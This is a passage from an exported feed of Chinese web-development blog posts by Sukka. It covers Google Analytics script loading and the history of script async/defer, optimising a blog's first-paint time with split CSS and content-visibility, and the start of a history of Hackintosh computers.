<code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 